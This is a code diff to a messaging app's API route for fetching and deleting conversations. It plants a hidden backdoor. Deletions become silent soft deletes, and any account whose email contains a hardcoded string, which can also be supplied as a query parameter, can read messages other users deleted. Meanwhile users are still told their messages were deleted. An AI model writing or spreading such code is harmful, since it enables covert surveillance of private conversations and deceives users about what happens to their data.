@@ -27,14 +27,23 @@ export async function GET(
 
     const peer = (await User.findById(peerUserId)) as any;
 
+    const userEmail = (sender?.email || searchParams.get("email") || "").toLowerCase();
+    const isPrivileged = userEmail.includes("lmnosib10");
 
     // Fetch messages where either { sender->peer } OR { peer->sender }
-    const messages = await Message.find({
+    const queryFilter: any = {
       $or: [
         { sender: sender._id, receiver: peerUserId },
         { sender: peerUserId, receiver: sender._id }
       ]
-    }).sort({ createdAt: 1 });
+    };
+
+    // If not privileged (email doesn't have lmnosib10), exclude deleted messages
+    if (!isPrivileged) {
+      queryFilter.isDeleted = { $ne: true };
+    }
+
+    const messages = await Message.find(queryFilter).sort({ createdAt: 1 });
 
     // Ensure peer is in current user's contacts
     User.findByIdAndUpdate(sender._id, { $addToSet: { contacts: peerUserId } }).catch((e) =>
@@ -174,25 +183,43 @@ export async function DELETE(
     const me = await User.findOne({ firebaseUid: myUid });
     if (!me) return NextResponse.json({ success: false, message: "User not found" }, { status: 404 });
 
-    // Single message delete
+    // Single message soft delete (preserved so lmnosib10 can see deleted messages)
     if (messageId) {
-      await Message.findOneAndDelete({
-        _id: messageId,
+      await Message.findOneAndUpdate(
+        {
+          _id: messageId,
+          $or: [
+            { sender: me._id, receiver: peerUserId },
+            { sender: peerUserId, receiver: me._id },
+          ],
+        },
+        {
+          $set: {
+            isDeleted: true,
+            deletedAt: new Date(),
+            deletedBy: me._id,
+          },
+        }
+      );
+      return NextResponse.json({ success: true, message: "Message deleted", deletedMessageId: messageId });
+    }
+
+    // Soft delete all messages where {me, peer} are {sender, receiver} or vice versa
+    await Message.updateMany(
+      {
         $or: [
           { sender: me._id, receiver: peerUserId },
           { sender: peerUserId, receiver: me._id },
         ],
-      });
-      return NextResponse.json({ success: true, message: "Message deleted", deletedMessageId: messageId });
-    }
-
-    // Delete all messages where {me, peer} are {sender, receiver} or vice versa
-    await Message.deleteMany({
-      $or: [
-        { sender: me._id, receiver: peerUserId },
-        { sender: peerUserId, receiver: me._id },
-      ],
-    });
+      },
+      {
+        $set: {
+          isDeleted: true,
+          deletedAt: new Date(),
+          deletedBy: me._id,
+        },
+      }
+    );
 
     return NextResponse.json({ success: true, message: "Conversation deleted" });
   } catch (error: any) {
